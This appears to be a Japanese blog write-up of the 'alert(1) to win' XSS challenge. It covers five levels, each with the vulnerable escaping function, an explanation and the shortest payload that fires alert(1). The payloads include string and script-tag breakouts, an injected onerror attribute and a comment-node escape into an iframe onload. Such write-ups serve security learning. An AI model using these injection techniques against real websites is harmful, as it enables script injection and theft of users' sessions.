---
title: alert(1) to win Writeup
date: 2019-01-30
tags: ["XSS", "Challenge", "Security"]
excerpt: alert(1) to win Writeup
---
# Alert(1) to win
URL：https://alf.nu/alert(1)  
XSS Challengeができるサイトです。  
スコアの高さは文字数と反比例なので、コードゴルフみたいな一面もあります。


# 問題一覧
- [x] [Warmup](#Warmup)
- [x] [Adobe](#Adobe)
- [x] [JSON](#JSON)
- [x] [Markdown](#Markdown)
- [x] [DOM](#DOM) [](#)
- [x] [Callback](#Callback)
- [x] [Skandia](#Skandia)
- [x] [Template](#Template)
- [x] [JSON2](#JSON2)
- [x] [Skandia2](#Skandia2)
- [ ] [iframe](#iframe)
- [ ] [TI(S)M](#TISM)
- [ ] [JSON3](#JSON3)
- [x] [Skandia3](#Skandia3)
- [ ] [RFC4627](#RFC4627)
- [ ] [Well](#Well)
- [x] [No](#No)
- [ ] [K'Z'K](#K'Z'K)
- [ ] [K'Z'K-2](#K'Z'K-2)
- [ ] [K'Z'K-3](#K'Z'K-3)
- [ ] [Fruit](#Fruit)
- [ ] [Fruit2](#Fruit2)
- [ ] [Fruit3](#Fruit3)
- [ ] [Capitals](#Capitals)
- [ ] [Quine](#Quine)
- [ ] [Entities](#Entities)

## Warmup
```Javascript
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```
何のエスケープもない普通の問題です。12文字。
```
");alert(1,"
```

## Adobe
```Javascript
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```
`"`が`\"`にエスケープされます。  
`\"`と入力すると`\\"`となり、文字列として`console.log`を閉じることができます。  
末尾をコメントアウトして、14文字。
```
\");alert(1)//
```
## JSON
```Javascript
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```
`JSON.stringify`を用いたエスケープです。  
一度タグを閉じてから末尾をコメントアウトすると最短。27文字。
```
</script><script>alert(1)//
```

## Markdown
```Javascript
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```
サンプルで用意されている`[[img123|Description]]`をいれると、６行目の置換により
```html
<img alt="Description" src="img123.gif">
```
となります。  
５行目では`http://S+`の形の文字列を`<a>`タグに変換しているため、後半を任意のURLに書き換えることで、以下のように`<img>`タグを閉じることができます。  
例：`Input：[[img123|http://xxx]]`
```html
<img alt="<a href="http://xxx" src="img123.gif">">http://xxx]]</a>
```
開発者ツールでこの部分を検証してみると以下のようになっており、`<img>`タグに`http:`属性と`xxx`属性が付与されたことがわかります。  
![markdown.png](https://github.com/mrypq/boilerplate/blob/master/img/markdown.png)  
htmlにおける`//`が区切り文字となっているためこのようなことが起こります。  
今回は存在しないgifの読み込みエラーが発生するため、`onerror`属性にスクリプトを仕込んだところ発火しました。  
末尾をコメントアウトで排除し、文字数削って31文字。
```
[[x|http://onerror=alert(1)//]]
```

## DOM
```Javascript
function escape(s) {
 // Slightly too lazy to make two input fields.
 // Pass in something like "TextNode#foo"
 var m = s.split(/#/);

 // Only slightly contrived at this point.
 var a = document.createElement('div');
 a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
 return a.innerHTML;
}
```
文字列Sを`#`で区切り、前半を`m[0]`後半を`m[1]`に代入しています。  
DOMの`document.create`から始まるメソッドを調べたところ、`document.createComment()`というメソッドがそれっぽかった。  
>**Document.createComment()**   
新しいコメントノードを生成して、返します。

参照：https://developer.mozilla.org/ja/docs/Web/API/Document  
`Comment#hoge`を入力すると`<!--hoge-->`が出力されるので、文頭のコメントアウトを閉じ、中身を発火させるhtmlに書き換えれば終了。iframeつかって32文字。
```
Comment#><iframe onload=alert(1)
```
Firefoxなどでは`svg/onload`が使えるのでさらに短くなるはずだけど、うまくいきませんでした。何故…。

## 以下随時更新予定
